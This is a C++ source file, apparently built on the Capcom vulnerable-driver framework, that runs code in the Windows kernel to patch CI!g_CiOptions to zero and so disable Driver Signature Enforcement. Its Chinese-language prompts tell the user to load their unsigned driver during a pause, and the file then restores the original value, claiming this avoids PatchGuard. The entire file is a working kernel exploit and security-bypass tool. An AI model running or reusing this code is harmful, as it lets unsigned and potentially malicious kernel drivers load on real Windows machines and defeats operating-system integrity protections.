#include <iostream>
#include <assert.h>
#include "LockedMemory.h"
#include "KernelRoutines.h"
#include "CapcomLoader.h"
#include "KernelHelper.h"
#include "CI.h"

int main()
{
	assert( Np_LockSections() );
	NON_PAGED_DATA static ULONG_PTR CiAddressOffset = 0;
	NON_PAGED_DATA static ULONG_PTR CiAddress = 0;
	CiAddressOffset = FindCiOptionsOffset();
	
	KernelContext* KrCtx = Kr_InitContext();
	CapcomContext* CpCtx = Cl_InitContext();

	assert( CpCtx );
	assert( KrCtx );

	Khu_Init( CpCtx, KrCtx );
	printf( "[+] Khk_PassiveCall @ %16llx\n", Khk_PassiveCallStub );

	NON_PAGED_DATA static char Format[] = "Jearning how to count: %s %s %s %s %d %d...";
	NON_PAGED_DATA static auto DbgPrint = KrCtx->GetProcAddress<>( "DbgPrint" );
	NON_PAGED_DATA static PVOID AllocatedMemory = 0;

	
	NON_PAGED_DATA static DWORD OriCodePolicy = 0; 
	
	if (CiAddressOffset)
	{
		if (m_osver >= WIN89200)
		{
			CiAddress = CiAddressOffset + KrCtx->CIBase;
		}
		else
		{
			CiAddress = CiAddressOffset + KrCtx->NtBase;
		}
	}

	//
	// Assume variable is in nonpaged .data section.
	//
	printf("[+] 开始Patch DSE %p \n", PVOID(CiAddress));

	CpCtx->ExecuteInKernel( NON_PAGED_LAMBDA()
	{
		// When you do something that requires interrupts to be enabled, use Khk_PassiveCall; such as a big memory allocation
		PVOID Out = ( PVOID ) Khk_CallPassive( Khk_ExAllocatePool, 0ull, 0x100000 );
		// Do not use memcpy, memset or ZeroMemory in kernel context; use Np_XXX equivalents
		Np_ZeroMemory( Out, 0x100000 );

		// Make sure all the UM data you reference from kernel has NON_PAGED_DATA prefix
		AllocatedMemory = Out;
		Format[ 0 ] = 'L';

		// 直接修改
		if (CiAddress)
		{
			OriCodePolicy = *((ULONG*)CiAddress);
			*((ULONG*)CiAddress) = 0;
		}

		// Do not call _enable()
		// _enable();

		// When you require a kernel api to be called use KrCtx to get it BEFORE you are in kernel context.
		// MmGetSystemRoutineAddress requires IRQL==PASSIVE_LEVEL and is bad engineering on capcom's side.

		// You can use data without NON_PAGED_DATA prefix in Khk_PassiveCall though. (the strings in this case)
		Khk_CallPassive( DbgPrint, Format, "1", "2", "3", "4", 5ull, 6ull );
		// Make sure you specify the sizes for the integers (5ull instead of 5)
	} );

	printf( "[+] AllocatedMemory @ %16llx\n", AllocatedMemory );
	printf("[+] 原先的CI!g_CiOptions的值是%lx,现在开始加载你的驱动;加载完成之后;请按下任意按键\n", OriCodePolicy);
	getchar();

	CpCtx->ExecuteInKernel(NON_PAGED_LAMBDA()
	{
		// 直接修改
		if (CiAddress)
		{
			*((ULONG*)CiAddress) = OriCodePolicy;
		}
	});

	printf("[+] 已经恢复了原始CI!g_CiOptions的值,应该不会触发PatchGuard;按下任意按键退出\n");
	getchar();

	Cl_FreeContext( CpCtx );
	Kr_FreeContext( KrCtx );
	
	return 0;
}
